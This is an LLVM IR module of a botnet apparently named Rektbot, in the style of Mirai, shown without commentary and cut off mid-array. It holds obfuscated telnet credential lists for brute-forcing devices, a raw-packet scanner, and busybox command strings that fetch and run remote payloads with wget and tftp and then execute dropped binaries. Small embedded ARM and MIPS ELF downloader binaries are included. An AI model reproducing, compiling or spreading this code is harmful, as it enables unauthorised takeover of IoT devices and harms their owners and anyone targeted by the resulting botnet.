; ModuleID = 'host/ir_O0/Rektbot.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%struct.payload = type { i8, i8, i8*, i16 }
%struct.scanner_auth = type { i8*, i8*, i16, i16, i8, i8 }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%union.__SOCKADDR_ARG = type { %struct.sockaddr* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.scanner_connection = type { %struct.scanner_auth*, %struct.telnet_info, i32, i32, i32, i32, i32, [8192 x i8], [16 x i8], i8, i8, i8, i8, i16, i16, i32, i32 }
%struct.telnet_info = type { i32, i32 }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.binary = type { i8*, i8 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.resolv_entries = type opaque

@fd_ctrl = global i32 -1, align 4
@fd_serv = global i32 -1, align 4
@pending_connection = global i8 0, align 1
@pid1 = common global i32 0, align 4
@pid2 = common global i32 0, align 4
@maintain_thread = common global i32 0, align 4
@LOCAL_ADDR = common global i32 0, align 4
@scanner_pid = common global i32 0, align 4
@spid = common global i32 0, align 4
@mainpid = common global i32 0, align 4
@srv_addr = common global %struct.sockaddr_in zeroinitializer, align 4
@.str = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.1 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.2 = private unnamed_addr constant [13 x i8] c"/bin/busybox\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"\00\00\00\01\00", align 1
@ensure_single_instance.local_bind = internal global i8 1, align 1
@fake_time = global i32 0, align 4
@rsck = common global i32 0, align 4
@scanner_rawpkt = global [40 x i8] zeroinitializer, align 16
@.str.20 = private unnamed_addr constant [5 x i8] c"PMMV\00", align 1
@.str.21 = private unnamed_addr constant [6 x i8] c"VVLGV\00", align 1
@.str.22 = private unnamed_addr constant [9 x i8] c"\13\12\12\13AJKL\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"KTFGT\00", align 1
@.str.24 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.25 = private unnamed_addr constant [4 x i8] c"@KL\00", align 1
@.str.26 = private unnamed_addr constant [8 x i8] c"FGDCWNV\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"FCGOML\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"AOQ\17\12\12\00", align 1
@.str.29 = private unnamed_addr constant [8 x i8] c"pmmv\17\12\12\00", align 1
@.str.30 = private unnamed_addr constant [5 x i8] c"pmmv\00", align 1
@.str.31 = private unnamed_addr constant [8 x i8] c"VQNKLWZ\00", align 1
@.str.32 = private unnamed_addr constant [9 x i8] c"XQWL\13\13\1A\1A\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"rNQaJEoG\13\00", align 1
@.str.34 = private unnamed_addr constant [8 x i8] c"WREPCFG\00", align 1
@.str.35 = private unnamed_addr constant [6 x i8] c"VGNAM\00", align 1
@.str.36 = private unnamed_addr constant [5 x i8] c"\13\13\13\13\00", align 1
@.str.37 = private unnamed_addr constant [5 x i8] c"\16\11\10\13\00", align 1
@.str.38 = private unnamed_addr constant [6 x i8] c"WKF\1F\12\00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"WKF\12\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"Q[QVGO\00", align 1
@.str.41 = private unnamed_addr constant [11 x i8] c"VGNLGVPMMV\00", align 1
@.str.42 = private unnamed_addr constant [13 x i8] c"PMMVRCQQUMPF\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"PMMVRCQQ\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"VGNLGVRCQQ\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"VGNLGVRCQQUMPF\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"RCQQUMPF\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"RCQQ\00", align 1
@.str.48 = private unnamed_addr constant [6 x i8] c"QJGNN\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"VCxXb\10\11\16\1B\17\1A\17\1B\00", align 1
@.str.50 = private unnamed_addr constant [10 x i8] c"VQEMKLEML\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"QWRGPWQGP\00", align 1
@.str.52 = private unnamed_addr constant [11 x i8] c"NKLWZQJGNN\00", align 1
@.str.53 = private unnamed_addr constant [15 x i8] c"V\12VCNA\12LVP\12N\16\03\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"EWGQV\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"\13\10\11\16\17\14\00", align 1
@.str.56 = private unnamed_addr constant [6 x i8] c"\13\10\11\16\17\00", align 1
@.str.57 = private unnamed_addr constant [5 x i8] c"WQGP\00", align 1
@.str.58 = private unnamed_addr constant [6 x i8] c"CFOKL\00", align 1
@.str.59 = private unnamed_addr constant [7 x i8] c"FGTKAG\00", align 1
@.str.60 = private unnamed_addr constant [5 x i8] c"\13\10\11\16\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\13\10\11\16\17\14\15\1A\1B\12\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"\13\13\13\13\13\13\00", align 1
@.str.63 = private unnamed_addr constant [5 x i8] c"\13\1B\1A\1A\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"\10\10\10\10\10\00", align 1
@.str.65 = private unnamed_addr constant [14 x i8] c"cFOKLKQVPCVMP\00", align 1
@.str.66 = private unnamed_addr constant [14 x i8] c"CFOKLKQVPCVMP\00", align 1
@.str.67 = private unnamed_addr constant [6 x i8] c"cFOKL\00", align 1
@.str.68 = private unnamed_addr constant [4 x i8] c"CFO\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"\15WHoIM\12CFOKL\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"QOACFOKL\00", align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"CFOKL\13\10\11\16\00", align 1
@.str.72 = private unnamed_addr constant [9 x i8] c"CFOKL\13\10\11\00", align 1
@.str.73 = private unnamed_addr constant [7 x i8] c"C@A\13\10\11\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"ACV\13\12\10\1B\22\00", align 1
@.str.75 = private unnamed_addr constant [4 x i8] c"\17WR\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"\03PMMV\00", align 1
@.str.77 = private unnamed_addr constant [2 x i8] c"\13\00", align 1
@.str.78 = private unnamed_addr constant [3 x i8] c"\13\10\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"CLVQNS\00", align 1
@.str.80 = private unnamed_addr constant [9 x i8] c"\13\10\11\16\17\14\15\1A\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"\12\12\12\12\12\12\00", align 1
@.str.82 = private unnamed_addr constant [9 x i8] c"\12\12\12\12\12\12\12\12\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"\13\10\11\16SUGP\00", align 1
@.str.84 = private unnamed_addr constant [9 x i8] c"CLLK\10\12\13\11\00", align 1
@.str.85 = private unnamed_addr constant [6 x i8] c"\17\16\11\10\13\00", align 1
@.str.86 = private unnamed_addr constant [7 x i8] c"XNZZ\0C\22\00", align 1
@.str.87 = private unnamed_addr constant [6 x i8] c"HT@XF\00", align 1
@.str.88 = private unnamed_addr constant [5 x i8] c"CLIM\00", align 1
@.str.89 = private unnamed_addr constant [8 x i8] c"ZOJFKRA\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"ZA\11\17\13\13\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"TKXZT\00", align 1
@.str.92 = private unnamed_addr constant [8 x i8] c"CLVQNS\22\00", align 1
@.str.93 = private unnamed_addr constant [9 x i8] c"HWCLVGAJ\00", align 1
@.str.94 = private unnamed_addr constant [8 x i8] c"eo\1A\13\1A\10\22\00", align 1
@.str.95 = private unnamed_addr constant [7 x i8] c"\1A\1A\1A\1A\1A\1A\00", align 1
@.str.96 = private unnamed_addr constant [7 x i8] c"\14\14\14\14\14\14\00", align 1
@.str.97 = private unnamed_addr constant [9 x i8] c"JWLV\17\15\17\1B\00", align 1
@.str.98 = private unnamed_addr constant [11 x i8] c"QWRGPTKQMP\00", align 1
@.str.99 = private unnamed_addr constant [9 x i8] c"X[CF\13\10\11\16\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"OE\11\17\12\12\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"OGPNKL\00", align 1
@.str.102 = private unnamed_addr constant [8 x i8] c"QWRRMPV\00", align 1
@.str.103 = private unnamed_addr constant [7 x i8] c"VGNLGV\00", align 1
@.str.104 = private unnamed_addr constant [9 x i8] c"MRGPCVMP\00", align 1
@.str.105 = private unnamed_addr constant [37 x i8] c"enable\0D\0Asystem\0D\0Ashell\0D\0Ash\0D\0Aping ; sh\00", align 1
@.str.106 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.107 = private unnamed_addr constant [141 x i8] c"/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"arm\00", align 1
@.str.109 = private unnamed_addr constant [5 x i8] c"arm4\00", align 1
@.str.110 = private unnamed_addr constant [142 x i8] c"/bin/busybox cat /proc/cpuinfo || while read i; do /bin/busybox echo $i; done < /proc/cpuinfo || /bin/busybox dd if=/proc/cpuinfo count=1; %s\00", align 1
@tmp_dirs = global [15 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1.5, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2.6, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.4.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0)], align 16
@.str.111 = private unnamed_addr constant [18 x i8] c">%s.file && cd %s\00", align 1
@.str.112 = private unnamed_addr constant [32 x i8] c"/bin/busybox rm -rf .file %s %s\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c".rbot.binary\00", align 1
@.str.114 = private unnamed_addr constant [14 x i8] c".rbot.dropper\00", align 1
@.str.115 = private unnamed_addr constant [98 x i8] c"/bin/busybox cp /bin/busybox .rbot.binary; >.rbot.binary; /bin/busybox chmod 777 .rbot.binary; %s\00", align 1
@.str.116 = private unnamed_addr constant [8 x i8] c"unknown\00", align 1
@.str.117 = private unnamed_addr constant [142 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.sh -O- >.rbot.shell; /bin/busybox tftp -g -l .rbot.shell -r rbot.sh %d.%d.%d.%d; sh .rbot.shell; %s\00", align 1
@.str.118 = private unnamed_addr constant [41 x i8] c"/bin/busybox wget; /bin/busybox tftp; %s\00", align 1
@.str.119 = private unnamed_addr constant [101 x i8] c"/bin/busybox cp /bin/busybox .rbot.dropper; >.rbot.dropper; /bin/busybox chmod 777 .rbot.dropper; %s\00", align 1
@.str.120 = private unnamed_addr constant [125 x i8] c"/bin/busybox wget http://%d.%d.%d.%d/rbot.%s -O- >.rbot.binary; /bin/busybox chmod 777 .rbot.binary;./.rbot.binarys wget; %s\00", align 1
@.str.121 = private unnamed_addr constant [121 x i8] c"/bin/busybox tftp -g -l .rbot.binary -r rbot.%s %d.%d.%d.%d; /bin/busybox chmod 777 .rbot.binary;./.rbot.binary tftp; %s\00", align 1
@.str.123 = private unnamed_addr constant [2 x i8] c">\00", align 1
@.str.124 = private unnamed_addr constant [3 x i8] c">>\00", align 1
@.str.125 = private unnamed_addr constant [36 x i8] c"./.rbot.dropper;./.rbot.binary echo\00", align 1
@.str.126 = private unnamed_addr constant [24 x i8] c"chmod 777 .rbot.dropper\00", align 1
@.str.122 = private unnamed_addr constant [50 x i8] c"/bin/busybox echo -en '%s' %s .rbot.dropper;%s;%s\00", align 1
@.str.150 = private unnamed_addr constant [21 x i8] c"ead-only file system\00", align 1
@.str.151 = private unnamed_addr constant [17 x i8] c"ermission denied\00", align 1
@.str.130 = private unnamed_addr constant [7 x i8] c"\5Cx%02x\00", align 1
@payloads = global [4 x %struct.payload] [%struct.payload { i8 1, i8 40, i8* getelementptr inbounds ([1081 x i8], [1081 x i8]* @.str.16, i32 0, i32 0), i16 1080 }, %struct.payload { i8 1, i8 41, i8* getelementptr inbounds ([1337 x i8], [1337 x i8]* @.str.17, i32 0, i32 0), i16 1336 }, %struct.payload { i8 2, i8 8, i8* getelementptr inbounds ([1889 x i8], [1889 x i8]* @.str.18, i32 0, i32 0), i16 1888 }, %struct.payload { i8 1, i8 8, i8* getelementptr inbounds ([1921 x i8], [1921 x i8]* @.str.19, i32 0, i32 0), i16 1920 }], align 16
@.str.16 = private unnamed_addr constant [1081 x i8] c"\7FELF\01\01\01a\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00\DC\82\00\004\00\00\00p\03\00\00\02\02\00\004\00 \00\02\00(\00\05\00\04\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00P\03\00\00P\03\00\00\05\00\00\00\00\80\00\00\01\00\00\00P\03\00\00P\03\01\00P\03\01\00\00\00\00\00\08\00\00\00\06\00\00\00\00\80\00\00\01\18\A0\E1\FF\18\01\E2\00\1C\81\E1\FF0\03\E2\02$\A0\E1\03\10\81\E1\FF,\02\E2\01 \82\E1\FF<\02\E2\FF\08\02\E2\034\A0\E1 \04\A0\E1\22\0C\80\E1\02<\83\E1\00\00\83\E1\0E\F0\A0\E1\00\10\A0\E1\00\00\9F\E5\87\00\00\EA\01\00\90\00\00\10\A0\E1\00\00\9F\E5\83\00\00\EA\06\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1|\00\00\EA\05\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\03\10\A0\E3\0D \A0\E1\08\00\9F\E5t\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1k\00\00\EA\04\00\90\00\01\C0\A0\E1\00\10\A0\E1\08\00\9F\E5\020\A0\E1\0C \A0\E1d\00\00\EA\03\00\90\00\04\E0-\E5\0C\D0M\E2\07\00\8D\E8\01\10\A0\E3\0D \A0\E1\08\00\9F\E5\5C\00\00\EB\0C\D0\8D\E2\00\80\BD\E8f\00\90\00\F0A-\E9@\E1\9F\E5\94\D0M\E2\00\00\00\EA\01\E0\8E\E2\00`\DE\E5\00\00V\E3\FB\FF\FF\1A$\C1\9F\E5\D00\A0\E3\0E\80l\E0\02@\A0\E3P\C0\A0\E3k\10\A0\E3\85 \A0\E3\B0\00\A0\E3\83\C0\CD\E5\80@\CD\E5\81`\CD\E5\82`\CD\E5\A9\FF\FF\EB\F4\10\9F\E5\84\00\8D\E5\F0 \9F\E5\F0\00\9F\E5\BC\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\04\00\A0\E1\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\AA\FF\FF\0B\05\00\A0\E1\80\10\8D\E2\10 \A0\E3\B5\FF\FF\EB\00\00P\E3\00\00`\B2\A3\FF\FF\BB\17@\88\E2\05\00\A0\E1\A0\10\9F\E5\04 \A0\E1\B7\FF\FF\EB\04\00P\E1\03\00\A0\13\9B\FF\FF\1B\06@\A0\E1\93\10\8D\E2\01 \A0\E3\05\00\A0\E1\B6\FF\FF\EB\01\00P\E3\04\00\A0\E3\93\FF\FF\1B\930\DD\E5\04D\83\E1d0\9F\E5\03\00T\E1\F3\FF\FF\1A\0D\10\A0\E1\80 \A0\E3\05\00\A0\E1\AA\FF\FF\EB\00 P\E2\0D@\A0\E1\0D\10\A0\E1\07\00\A0\E1\01\00\00\DA\9D\FF\FF\EB\F4\FF\FF\EA\05\00\A0\E1\85\FF\FF\EB\07\00\A0\E1\83\FF\FF\EB\05\00\A0\E3}\FF\FF\EB\94\D0\8D\E2\F0\81\BD\E8\1C\83\00\00A\02\00\00\FF\01\00\00$\83\00\004\83\00\00\0A\0D\0A\0D\A5\FF\FF\EAp@-\E9\10@\8D\E2p\00\94\E8q\00\90\EF\01\0Ap\E3\00@\A0\E1p\80\BD\98\03\00\00\EB\000d\E2\000\80\E5\00\00\E0\E3p\80\BD\E8\00\00\9F\E5\0E\F0\A0\E1P\03\01\00arm4\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm4 HTTP/1.0\0D\0A\0D\0A\00\00.shstrtab\00.text\00.rodata\00.bss\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00t\80\00\00t\00\00\00\A8\02\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\1C\83\00\00\1C\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\00\00\00P\03\01\00P\03\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00P\03\00\00\1E\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.17 = private unnamed_addr constant [1337 x i8] c"\7FELF\01\01\01\00\00\00\00\00\00\00\00\00\02\00(\00\01\00\00\00l\83\00\004\00\00\00H\04\00\00\02\00\00\044\00 \00\04\00(\00\06\00\05\00\01\00\00\00\00\00\00\00\00\80\00\00\00\80\00\00\14\04\00\00\14\04\00\00\05\00\00\00\00\80\00\00\01\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\10\00\00\00\10\00\00\00\06\00\00\00\00\80\00\00\07\00\00\00\14\04\00\00\14\04\01\00\14\04\01\00\00\00\00\00\08\00\00\00\04\00\00\00\04\00\00\00Q\E5td\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\018\83\E1\00<\83\E1\024\83\E1\03\0C\A0\E1\02\08\80\E1\FF(\03\E2\22\04\80\E1#\0C\80\E1\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\01\00\A0\E3\9D\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\00\10\A0\E1\04\D0M\E2\06\00\A0\E3\95\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\05\00\A0\E3\8A\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5\7F\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\1B\01\00\00\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\04\00\A0\E3s\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\03\00\A0\E3h\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\04\E0-\E5\01\C0\A0\E1\020\A0\E1\00\10\A0\E1\04\D0M\E2\0C \A0\E1\0C\00\9F\E5]\00\00\EB\04\D0\8D\E2\04\E0\9D\E4\1E\FF/\E1\19\01\00\00\F0A-\E9@1\9F\E5\98\D0M\E2\00@\A0\E3\00\00\00\EA\01@\84\E2\01`S\E5\00\00V\E3\010\83\E2\FA\FF\FF\1A\02\C0\A0\E3\D00\A0\E3k\10\A0\E3\85 \A0\E3\B4\C8\CD\E1\B0\00\A0\E3\05\CA\A0\E3\B6\C8\CD\E1\9A\FF\FF\EB\FC\10\9F\E5\88\00\8D\E5\F8 \9F\E5\F8\00\9F\E5\AE\FF\FF\EB\01\10\A0\E3\00p\A0\E1\06 \A0\E1\02\00\A0\E3\D6\FF\FF\EB\01\00p\E3\01\00w\13\00P\A0\E1\01\00\A0\03\94\FF\FF\0B\05\00\A0\E1\84\10\8D\E2\10 \A0\E3\AB\FF\FF\EB\00\00P\E3\00\00`\B2\8D\FF\FF\BB\17@\84\E2\05\00\A0\E1\A8\10\9F\E5\04 \A0\E1\AF\FF\FF\EB\04\00P\E1\03\00\A0\13\85\FF\FF\1B\94\80\9F\E5\06@\A0\E1\97`\8D\E2\06\10\A0\E1\01 \A0\E3\05\00\A0\E1\B0\FF\FF\EB\01\00P\E3\04\00\A0\E3{\FF\FF\1B\970\DD\E5\04D\83\E1\08\00T\E1\F4\FF\FF\1A\04@\8D\E2\04\10\A0\E1\80 \A0\E3\05\00\A0\E1\A4\FF\FF\EB\00 P\E2\04\10\A0\E1\07\00\A0\E1\01\00\00\DA\94\FF\FF\EB\F5\FF\FF\EA\05\00\A0\E1r\FF\FF\EB\07\00\A0\E1p\FF\FF\EB\05\00\A0\E3f\FF\FF\EB\98\D0\8D\E2\F0A\BD\E8\1E\FF/\E1\E1\83\00\00A\02\00\00\FF\01\00\00\E8\83\00\00\F8\83\00\00\0A\0D\0A\0D\A5\FF\FF\EA\0D\C0\A0\E1\F0\00-\E9\00p\A0\E1\01\00\A0\E1\02\10\A0\E1\03 \A0\E1x\00\9C\E8\00\00\00\EF\F0\00\BD\E8\01\0Ap\E3\0E\F0\A01\FF\FF\FF\EA\04\E0-\E5\1C \9F\E5\000\A0\E1\02 \9F\E7\06\00\00\EB\000c\E2\020\80\E7\00\00\E0\E3\04\E0\9D\E4\1E\FF/\E1l\80\00\00\00\00\00\00\0F\0A\E0\E3\1F\F0@\E2\00\00\A0\E1\00\00\A0\E1arm7\00\00\00\00.rbot.binary\00\00\00\00GET /rbot.arm7 HTTP/1.0\0D\0A\0D\0A\00\00\00\00\00\00\00\00\00\00\00\00\00\08\00\00\00\00.shstrtab\00.text\00.rodata\00.tbss\00.got\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\0B\00\00\00\01\00\00\00\06\00\00\00\C0\80\00\00\C0\00\00\00 \03\00\00\00\00\00\00\00\00\00\00\10\00\00\00\00\00\00\00\11\00\00\00\01\00\00\002\00\00\00\E0\83\00\00\E0\03\00\004\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\01\00\00\00\19\00\00\00\08\00\00\00\03\04\00\00\14\04\01\00\14\04\00\00\08\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\00\00\00\00\1F\00\00\00\01\00\00\00\03\00\00\00\14\04\01\00\14\04\00\00\10\00\00\00\00\00\00\00\00\00\00\00\04\00\00\00\04\00\00\00\01\00\00\00\03\00\00\00\00\00\00\00\00\00\00\00$\04\00\00$\00\00\00\00\00\00\00\00\00\00\00\01\00\00\00\00\00\00\00\00", align 1
@.str.18 = private unnamed_addr constant [1889 x i8] c"\7FELF\01\02\01\00\00\00\00\00\00\00\00\00\00\02\00\08\00\00\00\01\00@\04`\00\00\004\00\00\06H\00\00\10\07\004\00 \00\03\00(\00\07\00\06\00\00\00\01\00\00\00\00\00@\00\00\00@\00\00\00\00\05\B4\00\00\05\B4\00\00\00\05\00\01\00\00\00\00\00\01\00\00\05\C0\00D\05\C0\00D\05\C0\00\00\00T\00\00\00p\00\00\00\06\00\01\00\00dt\E5Q\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\00\07\00\00\00\04\00\00\00\00\00\00\00\00\00\00\00\000\A5\00\FF\00\05,\00\00\04&\00\00\85 %0\C2\00\FF0\E7\00\FF\00\87 %\00\02\12\00\03\E0\00\08\00D\10%<\1C\00\05'\9C\84\E8\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A1<\1C\00\05'\9C\84\CC\03\99\E0!\8F\99\80\5C\00\80(!\03 \00\08$\04\0F\A6<\1C\00\05'\9C\84\B0\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A5<\1C\00\05'\9C\84\88\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\03\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\84<\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A4<\1C\00\05'\9C\84\14\03\99\E0!\00\A0\10!\8F\99\80\5C\00\C08!\00\80(!\00@0!\03 \00\08$\04\0F\A3<\1C\00\05'\9C\83\EC\03\99\E0!'\BD\FF\D0\AF\BF\00(\AF\BC\00\10\8F\99\80\5C\AF\A4\00\18\AF\A5\00\1C\AF\A6\00 $\04\10\06'\A6\00\18\03 \F8\09$\05\00\01\8F\BC\00\10\8F\BF\00(\00\00\00\00\03\E0\00\08'\BD\000<\1C\00\05'\9C\83\A0\03\99\E0!'\BD\FF@\AF\BF\00\BC\AF\B2\00\B8\AF\B1\00\B4\AF\B0\00\B0\AF\BC\00\10\8F\82\80\18\00\00\00\00$P\05\80\82\02\00\00\00\00\00\00\14@\FF\FD&\10\00\01&\10\FF\FF$\02\00\02\A7\A2\00\1C$\02\00P\A7\A2\00\1E\8F\82\80\18\8F\99\80L$\07\00\D0$\04\00\B0$\05\00k$\06\00\85$B\05\80\03 \F8\09\02\02\80#\8F\BC\00\10$\05\03\01\8F\84\80\18\8F\99\80`$\84\05\88$\06\01\FF\03 \F8\09\AF\A2\00 \8F\BC\00\10$\04\00\02\8F\99\80P$\05\00\02\00\000!\03 \F8\09\00@\90!\00@\88!$\02\FF\FF\8F\BC\00\10\12\22\00\03\00\00\00\00\16B\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\01\8F\BC\00\10\00\00\00\00\8F\99\80D\02  !'\A5\00\1C\03 \F8\09$\06\00\10\8F\BC\00\10\04A\00\07\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09\00\02 #\8F\BC\00\10\00\00\00\00\8F\85\80\18\8F\99\80H&\10\00\17$\A5\05\98\02  !\03 \F8\09\02\000!\8F\BC\00\10\10P\00\07\00\00\80!\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\03\8F\BC\00\10\00\00\80!\8F\99\808\02  !'\A5\00\18\03 \F8\09$\06\00\01\8F\BC\00\10$\03\00\01\8F\99\80T\10C\00\04$\04\00\04\03 \F8\09\00\00\00\00\8F\BC\00\10\83\A3\00\18\00\10\12\00\00C\80%<\02\0D\0A4B\0D\0A\16\02\FF\ED\00\00\00\00\8F\99\808'\B0\00,\02  !\02\00(!\03 \F8\09$\06\00\80\8F\BC\00\10\02\00(!\8F\99\80H\00@0!\18@\00\06\02@ !\03 \F8\09\00\00\00\00\8F\BC\00\10\10\00\FF\F0\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02  !\8F\BC\00\10\00\00\00\00\8F\99\80X\00\00\00\00\03 \F8\09\02@ !\8F\BC\00\10\00\00\00\00\8F\99\80T\00\00\00\00\03 \F8\09$\04\00\05\8F\BC\00\10\8F\BF\00\BC\8F\B2\00\B8\8F\B1\00\B4\8F\B0\00\B0\03\E0\00\08'\BD\00\C0<\1C\00\05'\9C\81P\03\99\E0!\03\E0\00!\04\11\00\01\00\00\00\00<\1C\00\05'\9C\818\03\9F\E0!\00\00\F8!\8F\99\80<\00\00\00\00\03 \00\08\00\00\00\00\00\00\00\00\00\00\00\00<\1C\00\05'\9C\81\10\03\99\E0!\00\80\10!\00\A0 !\00\C0(!\00\E00!\8F\A7\00\10\8F\A8\00\14\8F\A9\00\18\8F\AA\00\1C'\BD\FF\E0\AF\A8\00\10\AF\A9\00\14\AF\AA\00\18\AF\A2\00\1C\8F\A2\00\1C\00\00\00\0C\14\E0\00\03'\BD\00 \03\E0\00\08\00\00\00\00\00@ 